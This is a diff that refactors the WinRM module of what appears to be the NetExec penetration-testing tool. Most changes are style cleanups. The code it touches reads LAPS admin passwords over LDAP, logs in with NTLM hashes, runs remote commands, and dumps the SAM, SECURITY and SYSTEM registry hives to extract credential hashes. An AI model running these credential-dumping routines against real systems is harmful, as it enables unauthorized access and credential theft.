@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 import binascii
 import hashlib
 import os
@@ -13,10 +11,12 @@ from impacket.smbconnection import SMBConnection
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 
 from nxc.config import process_secret
-from nxc.connection import *
+from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.protocols.ldap.laps import LDAPConnect, LAPSv2Extract
 from nxc.logger import NXCAdapter
+import contextlib
+
 
 class winrm(connection):
     def __init__(self, args, db, host):
@@ -46,18 +46,16 @@ class winrm(connection):
         if self.args.no_smb:
             self.domain = self.args.domain
         else:
-            # try:
             smb_conn = SMBConnection(self.host, self.host, None, timeout=5)
             no_ntlm = False
             try:
                 smb_conn.login("", "")
             except BrokenPipeError:
-                self.logger.fail(f"Broken Pipe Error while attempting to login")
+                self.logger.fail("Broken Pipe Error while attempting to login")
             except Exception as e:
                 if "STATUS_NOT_SUPPORTED" in str(e):
                     # no ntlm supported
                     no_ntlm = True
-                pass
 
             self.domain = smb_conn.getServerDNSDomainName() if not no_ntlm else self.args.domain
             self.hostname = smb_conn.getServerName() if not no_ntlm else self.host
@@ -69,14 +67,8 @@ class winrm(connection):
 
             self.output_filename = os.path.expanduser(f"~/.nxc/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}")
 
-            try:
+            with contextlib.suppress(Exception):
                 smb_conn.logoff()
-            except:
-                pass
-            # except Exception as e:
-            #     self.logger.fail(
-            #         f"Error retrieving host domain: {e} specify one manually with the '-d' flag"
-            #     )
 
             if self.args.domain:
                 self.domain = self.args.domain
@@ -117,7 +109,7 @@ class winrm(connection):
                 ntlm_hash[0] if ntlm_hash else "",
             )
         if not connection:
-            self.logger.fail("LDAP connection failed with account {}".format(username[0]))
+            self.logger.fail(f"LDAP connection failed with account {username[0]}")
             return False
 
         search_filter = "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=" + self.hostname + "))"
@@ -141,39 +133,33 @@ class winrm(connection):
                 values = {str(attr["type"]).lower(): attr["vals"][0] for attr in host["attributes"]}
                 if "mslaps-encryptedpassword" in values:
                     from json import loads
+
                     msMCSAdmPwd = values["mslaps-encryptedpassword"]
-                    d = LAPSv2Extract(
-                        bytes(msMCSAdmPwd),
-                        username[0] if username else "",
-                        password[0] if password else "",
-                        domain,
-                        ntlm_hash[0] if ntlm_hash else "",
-                        self.args.kerberos,
-                        self.args.kdcHost,
-                        339)
+                    d = LAPSv2Extract(bytes(msMCSAdmPwd), username[0] if username else "", password[0] if password else "", domain, ntlm_hash[0] if ntlm_hash else "", self.args.kerberos, self.args.kdcHost, 339)
                     data = d.run()
                     r = loads(data)
                     msMCSAdmPwd = r["p"]
                     username_laps = r["n"]
                 elif "mslaps-password" in values:
                     from json import loads
+
                     r = loads(str(values["mslaps-password"]))
                     msMCSAdmPwd = r["p"]
                     username_laps = r["n"]
                 elif "ms-mcs-admpwd" in values:
                     msMCSAdmPwd = str(values["ms-mcs-admpwd"])
                 else:
-                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or" " msLAPS-Password")
-            self.logger.debug("Host: {:<20} Password: {} {}".format(sAMAccountName, msMCSAdmPwd, self.hostname))
+                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password")
+            self.logger.debug(f"Host: {sAMAccountName:<20} Password: {msMCSAdmPwd} {self.hostname}")
         else:
-            self.logger.fail("msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS" " property for {}".format(self.hostname))
+            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")
             return False
 
-        self.username = self.args.laps if not username_laps else username_laps
+        self.username = username_laps if username_laps else self.args.laps
         self.password = msMCSAdmPwd
 
         if msMCSAdmPwd == "":
-            self.logger.fail("msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS" " property for {}".format(self.hostname))
+            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")
             return False
         if ntlm_hash:
             hash_ntlm = hashlib.new("md4", msMCSAdmPwd.encode("utf-16le")).digest()
@@ -204,9 +190,9 @@ class winrm(connection):
 
         for url in endpoints:
             try:
-                self.logger.debug(f"winrm create_conn_obj() - Requesting URL: {url}")
-                res = requests.post(url, verify=False, timeout=self.args.http_timeout)
-                self.logger.debug("winrm create_conn_obj() - Received response code:" f" {res.status_code}")
+                self.logger.debug(f"Requesting URL: {url}")
+                res = requests.post(url, verify=False, timeout=self.args.http_timeout) 
+                self.logger.debug(f"Received response code: {res.status_code}")
                 self.endpoint = url
                 if self.endpoint.startswith("https://"):
                     self.logger.extra["port"] = self.args.port if self.args.port else 5986
@@ -217,16 +203,13 @@ class winrm(connection):
                 self.logger.info(f"Connection Timed out to WinRM service: {e}")
             except requests.exceptions.ConnectionError as e:
                 if "Max retries exceeded with url" in str(e):
-                    self.logger.info(f"Connection Timeout to WinRM service (max retries exceeded)")
+                    self.logger.info("Connection Timeout to WinRM service (max retries exceeded)")
                 else:
                     self.logger.info(f"Other ConnectionError to WinRM service: {e}")
         return False
 
     def plaintext_login(self, domain, username, password):
         try:
-            from urllib3.connectionpool import log
-
-            # log.addFilter(SuppressFilter())
             if not self.args.laps:
                 self.password = password
                 self.username = username
@@ -236,8 +219,8 @@ class winrm(connection):
                 auth="ntlm",
                 username=f"{domain}\\{self.username}",
                 password=self.password,
-                ssl=True if self.args.ssl else False,
-                cert_validation=False if self.args.ignore_ssl_cert else True,
+                ssl=bool(self.args.ssl),
+                cert_validation=not self.args.ignore_ssl_cert,
             )
 
             # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
@@ -249,11 +232,9 @@ class winrm(connection):
             self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
             self.db.add_credential("plaintext", domain, self.username, self.password)
             # TODO: when we can easily get the host_id via RETURNING statements, readd this in
-            # host_id = self.db.get_hosts(self.host)[0].id
-            # self.db.add_loggedin_relation(user_id, host_id)
 
             if self.admin_privs:
-                self.logger.debug(f"Inside admin privs")
+                self.logger.debug("Inside admin privs")
                 self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host)  # , user_id=user_id)
 
             if not self.args.local_auth:
@@ -269,9 +250,6 @@ class winrm(connection):
 
     def hash_login(self, domain, username, ntlm_hash):
         try:
-            # from urllib3.connectionpool import log
-
-            # log.addFilter(SuppressFilter())
             lmhash = "00000000000000000000000000000000:"
             nthash = ""
 
@@ -296,8 +274,8 @@ class winrm(connection):
                 auth="ntlm",
                 username=f"{self.domain}\\{self.username}",
                 password=lmhash + nthash,
-                ssl=True if self.args.ssl else False,
-                cert_validation=False if self.args.ignore_ssl_cert else True,
+                ssl=bool(self.args.ssl),
+                cert_validation=not self.args.ignore_ssl_cert,
             )
 
             # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
@@ -323,25 +301,29 @@ class winrm(connection):
 
     def execute(self, payload=None, get_output=False):
         try:
+            self.logger.debug(f"Connection: {self.conn}, and type: {type(self.conn)}")
             r = self.conn.execute_cmd(self.args.execute, encoding=self.args.codec)
-        except:
-            self.logger.info("Cannot execute command, probably because user is not local admin, but" " powershell command should be ok!")
-            r = self.conn.execute_ps(self.args.execute)
-        self.logger.success("Executed command")
-        buf = StringIO(r[0]).readlines()
-        for line in buf:
-            self.logger.highlight(line.strip())
-
+            self.logger.success("Executed command")
+            buf = StringIO(r[0]).readlines()
+            for line in buf:
+                self.logger.highlight(line.strip())
+        except Exception as e:
+            self.logger.debug(f"Error executing command: {e}")
+            self.logger.fail("Cannot execute command, probably because user is not local admin, but running via powershell (-X) may work")
 
     def ps_execute(self, payload=None, get_output=False):
-        r = self.conn.execute_ps(self.args.ps_execute)
-        self.logger.success("Executed command")
-        buf = StringIO(r[0]).readlines()
-        for line in buf:
-            self.logger.highlight(line.strip())
+        try:
+            r = self.conn.execute_ps(self.args.ps_execute)
+            self.logger.success("Executed command")
+            buf = StringIO(r[0]).readlines()
+            for line in buf:
+                self.logger.highlight(line.strip())
+        except Exception as e:
+            self.logger.debug(f"Error executing command: {e}")
+            self.logger.fail("Command execution failed")
 
     def sam(self):
-        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM" " C:\\windows\\temp\\SYSTEM")
+        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
         self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
         self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
         self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")
@@ -358,7 +340,7 @@ class winrm(connection):
         SAM.export(f"{self.output_filename}.sam")
 
     def lsa(self):
-        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM" " C:\\windows\\temp\\SYSTEM")
+        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
         self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
         self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
         self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")
